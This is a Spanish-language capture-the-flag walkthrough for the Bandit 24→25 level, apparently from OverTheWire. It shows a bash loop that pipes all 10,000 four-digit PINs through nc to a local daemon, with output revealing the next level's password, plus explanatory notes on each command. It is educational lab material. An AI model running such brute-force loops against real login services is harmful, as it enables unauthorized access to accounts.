## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## Datos de acceso al nivel
bandit24
**Contraseña:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
## Solución
```bash
bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i ; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.

...

Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

```bash
bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i ; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
## Notas adicionales

**grep -v** - filtra las líneas que contengan una palabra que le especifiquemos.
**for i in {0000..9999}:** Este bucle `for` itera desde el número `0000` hasta el `9999`, generando todos los números de 4 dígitos, incluyendo los ceros iniciales (por ejemplo: 0000, 0001, 0002, ..., 9999).
**do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done**: En cada iteración del bucle, se ejecuta el comando `echo` para imprimir la cadena `"gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"` seguida de un número de 4 dígitos (el valor de la variable `i`).
**nc localhost 30002**: El comando `nc` se utiliza para enviar datos a través de la red. En este caso, está enviando la salida del `echo` al servidor que está escuchando en `localhost` (la propia máquina) en el puerto `30002`.


## Referencias